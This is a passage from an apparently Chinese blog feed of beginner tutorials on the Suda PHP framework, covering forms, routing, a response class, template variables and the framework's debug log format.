class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Action PAGE<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">    | Form 表单 </span></span><br><span class="line"><span class="comment">    | action 表示提交数据到哪个页面</span></span><br><span class="line"><span class="comment">    | method 表示提交方式（GET，POST 两种） </span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"@u"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"text_value"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> <span class="attr">name</span>=<span class="string">"int_value"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交GET数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"@u"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"text_value"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> <span class="attr">name</span>=<span class="string">"int_value"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交POST数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>提交的数据 &#123;&#123;$:method&#125;&#125; <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123;&#123; $:text &#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123;&#123; $:int &#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><ol><li>把今天的网页自己写好,我故意没写详细,这样你们多练习下。</li><li>写一个超链接，跳到 hello 页面</li></ol>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 03 动态页面及日志记录</title>
      <link href="/2018/08/01/suda-action-page/"/>
      <url>/2018/08/01/suda-action-page/</url>
      <content type="html"><![CDATA[<p>本例将学习创建个动态页面以及学习日志的查看和使用。</p><a id="more"></a><h2 id="MVC模式说明"><a href="#MVC模式说明" class="headerlink" title="MVC模式说明"></a>MVC模式说明</h2><p>在Web开发中，用的比较多的方式就是分层设计，最常用的分层模式便是 MVC模式（Model View Controller）</p><ul><li><code>Model</code> 层：业务模型层，处理业务规则</li><li><code>View</code> 层：交互界面层，用户看到并与之交互的界面</li><li><code>Controller</code> 层：接受用户的输入并调用模型和视图去完成用户的需求</li></ul><blockquote><p>Any problem  in computer science can be solved by anther layer of indirection.<br>计算机科学领域的任何问题都可以通过增加一个间接的中间层来解决<br>— 某大佬</p></blockquote><h2 id="框架的分层"><a href="#框架的分层" class="headerlink" title="框架的分层"></a>框架的分层</h2><p>在框架中，分层模式不明显也不强调，按照自己的思路来编写代码也可，不过推荐按照一定的规则来对操作进行分层，方便自己也方便他人，一般来说我写代码的时候会分层如下几层</p><ul><li><code>Response</code> 层：对应 MVC 分层中的控制器层，控制界面显示处理业务逻辑</li><li><code>Table</code> 层：负责控制业务数据持久化数据的操作</li><li><code>Model</code> 层：负责对业务逻辑的处理以及使用Table层对数据持久化</li><li><code>Controller</code> 层：负责数据处理以及调用模型</li><li><code>Provider</code> 层：提供对外API的映射以及构建以及权限验证</li></ul><p>当业务逻辑不复杂的时候我会把 <code>Model</code> 和 <code>Table</code> 层合并做 <code>Table</code> 层。既各层级的职能分配如下</p><ul><li><code>Response</code> 层：对应 MVC 分层中的控制器层，控制界面显示处理业务逻辑</li><li><code>Table</code> 层：负责对业务逻辑的处理、数据的持久化数据的操作</li><li><code>Controller</code> 层：负责数据处理以及调用模型</li><li><code>Provider</code> 层：提供对外API的映射以及构建以及权限验证</li></ul><h2 id="创建一个动态页面"><a href="#创建一个动态页面" class="headerlink" title="创建一个动态页面"></a>创建一个动态页面</h2><p>在上一次课中我们创建了一个静态页面，我们现在创建一个动态页面，该页面实现功能如下：显示请求的IP地址和时间。记录一条info日志。并记录运行时长。</p><h3 id="步骤一：先建一条路由"><a href="#步骤一：先建一条路由" class="headerlink" title="步骤一：先建一条路由"></a>步骤一：先建一条路由</h3><p>打开上节课的路由文件，添加一条路由。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"index"</span>: &#123;</span><br><span class="line">        <span class="attr">"class"</span>: <span class="string">"cn\\atd3\\response\\IndexResponse"</span>,</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"\/"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"hello"</span>: &#123;</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"\/hello"</span>,</span><br><span class="line">        <span class="attr">"template"</span>: <span class="string">"hello"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"action_page"</span>: &#123;</span><br><span class="line">        <span class="attr">"url"</span>: <span class="string">"\/action-page"</span>,</span><br><span class="line">        <span class="attr">"class"</span>: <span class="string">"cn\\atd3\\response\\ActionPageResponse"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>action_page</code> 为本次我们创建的页面路由，该路由会在用户访问 <code>/action-page</code> 是调用 <code>cn\atd3\response\ActionPageResponse</code> 类。</p><h3 id="步骤2：创建路由类"><a href="#步骤2：创建路由类" class="headerlink" title="步骤2：创建路由类"></a>步骤2：创建路由类</h3><p>在Suda框架中，推荐使用类来代替传统的从头到尾的脚本，不清楚的可以参考 ：<a href="http://php.net/manual/zh/language.oop5.php" target="_blank" rel="noopener">PHP类参考</a> ，在框架中，处理请求的类为 <code>suda\core\Request</code>，处理响应的类为 <code>suda\core\Response</code> ，本课我们使用响应类来处理请求，这个类是一个抽象类，需要继承；</p><p>打开 <code>src</code> 文件夹，在文件夹下创建一个文件 <code>ActionPageResponse.php</code> ，这个文件会在加载 <code>cn\atd3\response\ActionPageResponse</code> 类的时候自动被包含，其中 <code>src</code> 的根命名空间为 <code>cn\atd3\response</code> 也就是说，框架加载类中包含 <code>cn\atd3\response\类名</code> 都是在这个文件夹中搜索。</p><p>现在的目录结构如下：</p><p><img src="1.png" alt=""></p><p>现在我们在里面编写代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cn</span>\<span class="title">atd3</span>\<span class="title">response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">core</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ActionPageResponse</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">core</span>\<span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onRequest</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello World'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问页面可以得到如下结果：</p><p><img src="2.png" alt=""></p><h3 id="步骤3：使用模板"><a href="#步骤3：使用模板" class="headerlink" title="步骤3：使用模板"></a>步骤3：使用模板</h3><p>创建一个新的模板文件，命名为 action-page (对应的路径为 resource/template/default/action-page.tpl.html)<br>并写入代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Action PAGE<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="步骤4：引入模板并显示"><a href="#步骤4：引入模板并显示" class="headerlink" title="步骤4：引入模板并显示"></a>步骤4：引入模板并显示</h3><p>修改  <code>ActionPageResponse.php</code> 加入如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$view = <span class="keyword">$this</span>-&gt;page(<span class="string">'action-page'</span>); <span class="comment">// 创建一个页面并使用 action-page.tpl.html 作为模板</span></span><br><span class="line">$view-&gt;render();  <span class="comment">// 渲染模板显示出来</span></span><br></pre></td></tr></table></figure><p>现在的代码以及文件结构如下：</p><p><img src="3.png" alt=""></p><p>访问，得到如下结果</p><p><img src="4.png" alt=""></p><h3 id="步骤5：插入动态变量"><a href="#步骤5：插入动态变量" class="headerlink" title="步骤5：插入动态变量"></a>步骤5：插入动态变量</h3><p>修改页面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$view = <span class="keyword">$this</span>-&gt;page(<span class="string">'action-page'</span>); <span class="comment">// 创建一个页面并使用 action-page.tpl.html 作为模板</span></span><br><span class="line">$view-&gt;set(<span class="string">'ip'</span>,$request-&gt;ip()); <span class="comment">// 获取IP并压入模板</span></span><br><span class="line">$view-&gt;set(<span class="string">'time'</span>,date(<span class="string">'Y-m-d H:i:s'</span>,time())); <span class="comment">// 压入时间</span></span><br><span class="line">$view-&gt;render();  <span class="comment">// 渲染模板显示出来</span></span><br></pre></td></tr></table></figure><p>修改模板代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span> &#123;&#123; $:ip &#125;&#125; - &#123;&#123; $:time &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>{{ }}</code> 表示是一个动态参数，<code>$:ip</code> 表示使用模板中的变量 <code>ip</code> , 使用 <code>$:</code> 来与 PHP变量符号 <code>$</code> 区分。</p><p>现在的页面结构如下：</p><p><img src="5.png" alt=""></p><p>访问后</p><p><img src="/images/placeholder.png" alt="" data-src="6.png" class="lazyload"></p><h3 id="步骤6：插入日志并查看"><a href="#步骤6：插入日志并查看" class="headerlink" title="步骤6：插入日志并查看"></a>步骤6：插入日志并查看</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug()-&gt;info(<span class="string">'日志信息'</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/placeholder.png" alt="" data-src="7.png" class="lazyload"></p><p>日志文件路径：<code>app/data/logs/latest.log</code>，日志不会自动删除，在日志文件大于 2M 时会被压缩打包，</p><p>日志文件内容：</p><p><img src="/images/placeholder.png" alt="" data-src="8.png" class="lazyload"></p><p>日志摘录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">=====9744c0=====233.233.233.233=====debug=====</span><br><span class="line">233.233.233.2332018-08-01 09:44:36GET/action-page</span><br><span class="line">[0.0157389641 s : 438.27 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\System.php:58]suda\core\System#initsystem init</span><br><span class="line">[0.0169818401 s : 546.16 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\System.php:111]suda\core\System#readManifastreading manifast file</span><br><span class="line">[0.0177240372 s : 548.71 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\System.php:104]suda\core\System#consoleloading application suda\core\Application from D:\Server\vhost\dxkite.org\test\public/../app</span><br><span class="line">[0.0193159580 s : 648.66 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\Application.php:81]suda\core\Application#__constructapplication load D:\Server\vhost\dxkite.org\test\public/../app</span><br><span class="line">[0.0219209194 s : 650.99 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\Application.php:525]suda\core\Application#registerModuleload module config D:\Server\vhost\dxkite.org\test\suda\system\resource\modules/dxkite-suda/module.json</span><br><span class="line">[0.0254838467 s : 884.95 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\Application.php:525]suda\core\Application#registerModuleload module config D:\Server\vhost\dxkite.org\test\app\modules/app/module.json</span><br><span class="line">[0.0263028145 s : 887.67 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\Application.php:337]live modules[&quot;demo\/app:1.0.0-dev&quot;,&quot;dxkite\/suda:1.0.6&quot;]</span><br><span class="line">[0.0268199444 s : 887.74 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\Hook.php:31]suda\core\Hook#loadConfigD:\Server\vhost\dxkite.org\test\app\modules/app/resource/config/listener.json</span><br><span class="line">[0.0278959274 s : 889.52 KB][info][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\template\Manager.php:117]suda\template\Manager#themechange themes:default</span><br><span class="line">[0.0285499096 s : 913.83 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\tool\Command.php:49]suda\tool\Command#execexec command &#123;closure command&#125; with args []</span><br><span class="line">[0.0288488865 s : 913.8 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\tool\Command.php:49]suda\tool\Command#execexec command &#123;closure command&#125; with args []</span><br><span class="line">[0.0291199684 s : 912.6 KB][info][D:\Server\vhost\dxkite.org\test\suda\system\suda.php:7]suda\core\System#runprocess init application 0.013243s</span><br><span class="line">[0.0294208527 s : 914.97 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\Application.php:365]reachable modules[&quot;demo\/app:1.0.0-dev&quot;]</span><br><span class="line">[0.0296499729 s : 915.11 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\Router.php:71]suda\core\Router#loadload module:demo/app:1.0.0-dev path:D:\Server\vhost\dxkite.org\test\app\modules/app</span><br><span class="line">[0.0316369534 s : 998.84 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\Router.php:76]suda\core\Router#loadloading simple route from file D:\Server\vhost\dxkite.org\test\app\modules/app/resource/config/router.json</span><br><span class="line">[0.0341479778 s : 999.81 KB][info][D:\Server\vhost\dxkite.org\test\suda\system\suda.php:7]suda\core\System#runprocess init router 0.004893s</span><br><span class="line">[0.0343270302 s : 1003.75 KB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\tool\Command.php:49]suda\tool\Command#execexec command &#123;closure command&#125; with args [&#123;&#125;]</span><br><span class="line">[0.0345048904 s : 1000.93 KB][info][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\System.php:85]suda\core\Router#dispatchprocess dispatch 0.000221s</span><br><span class="line">[0.0353410244 s : 1.02 MB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\Application.php:383]suda\core\Application#activeModuleactive module demo/app:1.0.0-dev</span><br><span class="line">[0.0356998444 s : 1.02 MB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\Application.php:389]suda\core\Application#activeModuleset locale zh-CN</span><br><span class="line">[0.0377128124 s : 1.02 MB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\tool\Command.php:97]parse command cn\atd3\response\ActionPageResponse-&gt;onRequest[&quot;cn\\atd3\\response\\ActionPageResponse-&gt;onRequest&quot;,&quot;cn\\atd3\\response\\ActionPageResponse&quot;,&quot;-&gt;&quot;,&quot;onRequest&quot;]</span><br><span class="line">[0.0388419628 s : 1.04 MB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\tool\Command.php:49]suda\tool\Command#execexec command cn\atd3\response\ActionPageResponse-&gt;onRequest with args [&#123;&#125;]</span><br><span class="line">[0.0427668095 s : 1.05 MB][info][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\template\Manager.php:133]suda\template\compiler\suda\Compiler#compileprocess compile demo/app:1.0.0-dev:action-page 0.001639s</span><br><span class="line">[0.0445339680 s : 1.09 MB][info][D:\Server\vhost\dxkite.org\test\app\modules\app\src\ActionPageResponse.php:13]cn\atd3\response\ActionPageResponse#onRequest日志信息</span><br><span class="line">[0.0446398258 s : 1.09 MB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\template\compiler\suda\Template.php:99]start renderdemo/app:1.0.0-dev:action-page</span><br><span class="line">[0.0447850227 s : 1.11 MB][info][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\template\compiler\suda\Template.php:91]suda\template\compiler\suda\Template#echoprocess render demo/app:1.0.0-dev:action-page 0.000047s</span><br><span class="line">[0.0448758602 s : 1.09 MB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\template\compiler\suda\Template.php:107]free render [348]demo/app:1.0.0-dev:action-page</span><br><span class="line">[0.0449628830 s : 1.09 MB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\template\compiler\suda\Template.php:59]suda\template\compiler\suda\Template#renderecho demo/app:1.0.0-dev:action-page</span><br><span class="line">[0.0454258919 s : 1.07 MB][info][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\Router.php:336]suda\core\Router#runRouterprocess request 0.007781s</span><br><span class="line">[0.0455188751 s : 1.07 MB][info][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\System.php:85]suda\core\Router#dispatchprocess run router 0.010214s</span><br><span class="line">[0.0456018448 s : 1.07 MB][info][D:\Server\vhost\dxkite.org\test\suda\system\suda.php:7]suda\core\System#runprocess run request 0.011327s</span><br><span class="line">[0.0458300114 s : 1.07 MB][info][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\System.php:140]suda\core\Debug#timeEndprocess before shutdown 0.000111s</span><br><span class="line">[0.0466220379 s : 1.09 MB][info][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\System.php:150]suda\core\Cache#gcprocess cache gc 0.000109s</span><br><span class="line">[0.0467770100 s : 1.09 MB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\tool\Command.php:49]suda\tool\Command#execexec command &#123;closure command&#125; with args []</span><br><span class="line">[0.0469088554 s : 1.09 MB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\System.php:152]suda\core\System#onShutdownconnection status normal</span><br><span class="line">[0.0470139980 s : 1.09 MB][trace][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\System.php:155]suda\core\System#onShutdownsystem shutdown</span><br><span class="line">[0.0471739769 s : 1.09 MB][info][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\System.php:156]suda\core\Debug#timeEndprocess shutdown 0.001214s</span><br><span class="line">[0.0473518372 s : 1.09 MB][info][D:\Server\vhost\dxkite.org\test\suda\system\src\suda\core\Debug.php:406]suda\core\Debug#afterSystemRunprocess system 0.032624s</span><br><span class="line">=====9744c0=====0.0475850105=====1.0871 MB:1.5067 MB=====22:23.916 MB=====</span><br></pre></td></tr></table></figure><p>格式说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">=====请求指纹=====IP地址=====运行模式=====</span><br><span class="line">请求IP请求时间请求方法请求路径</span><br><span class="line">    [运行时间: 内存消耗][日志等级][文件位置]调用函数信息内容</span><br><span class="line">=====请求指纹=====运行时间=====消耗内存:最高内存消耗=====秒并发:并发消耗=====</span><br></pre></td></tr></table></figure><h2 id="作业："><a href="#作业：" class="headerlink" title="作业："></a>作业：</h2><p>编写一个自己的动态页面，内容与示例不同</p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 02 创建一个页面</title>
      <link href="/2018/07/30/suda-create-page/"/>
      <url>/2018/07/30/suda-create-page/</url>
      <content type="html"><![CDATA[<p>本文将介绍如何使用Suda框架创建一个简单的页面。</p><a id="more"></a><h2 id="目录文件功能介绍"><a href="#目录文件功能介绍" class="headerlink" title="目录文件功能介绍"></a>目录文件功能介绍</h2><p>在创建页面之前，我先介绍一下框架目录下各个文件夹的功能以及作用。 经过上一节内容我们的目录结构应该是如下的结构：</p><p><img src="1.png" alt=""></p><p>如果不是，或者目录结构是如下样式，则进行一波操作：</p><p><img src="2.png" alt=""></p><h3 id="调整目录结构"><a href="#调整目录结构" class="headerlink" title="调整目录结构"></a>调整目录结构</h3><ol><li>在目录下创建一个 <code>suda</code> 文件夹，将所有东西拷贝到目录下，现在的目录应该只有一个 <code>suda</code> 目录。</li><li><p>打开 suda 目录，找到 <code>suda-&gt;system-&gt;resource-&gt;project</code> 目录，将 project 目录下的东西放到当前目录下。</p><p> 现在的目录下应该有三个项目</p><ul><li>suda 文件夹</li><li>public 文件夹</li><li>.gitignore 文件</li></ul></li><li>访问网站 host/dev.php ，将会出现上一节的页面。此时目录调整完毕。</li></ol><p><img src="3.png" alt=""></p><h3 id="目录说明"><a href="#目录说明" class="headerlink" title="目录说明"></a>目录说明</h3><table><thead><tr><th>文件或者目录</th><th>说明</th></tr></thead><tbody><tr><td>suda 目录</td><td>该目录放置了框架的所有文件</td></tr><tr><td>app 目录</td><td>该目录放置了网站应用程序的所有代码</td></tr><tr><td>public 目录</td><td>该目录放置了一些用户可以访问到的文件以及静态文件</td></tr></tbody></table><h3 id="app-目录"><a href="#app-目录" class="headerlink" title="app 目录"></a>app 目录</h3><p>在开发的过程中，我们最经常用到的目录就是 <code>app</code> 目录，在这个目录下，放置了我们网站程序的所有源码。</p><table><thead><tr><th>文件或者目录</th><th>说明</th></tr></thead><tbody><tr><td>data 目录</td><td>该目录放置了网站程序运行时所产生的文件</td></tr><tr><td>modules 目录</td><td>该目录放置了网站应用程序的功能模块，每个模块包含了一个或者多个功能</td></tr><tr><td>resource 目录</td><td>该目录放置了网站程序公用的资源文件</td></tr><tr><td>share 目录</td><td>该目录放置了网站程序公用的代码文件</td></tr><tr><td>manifast.json 文件</td><td>该文件描述了网站应用的一些属性</td></tr></tbody></table><h3 id="manifast-json-文件"><a href="#manifast-json-文件" class="headerlink" title="manifast.json 文件"></a>manifast.json 文件</h3><p>该文件的默认内容如下，重要属性主要有两个 <code>modules</code>, <code>reachable</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"suda-test-app"</span>,</span><br><span class="line">    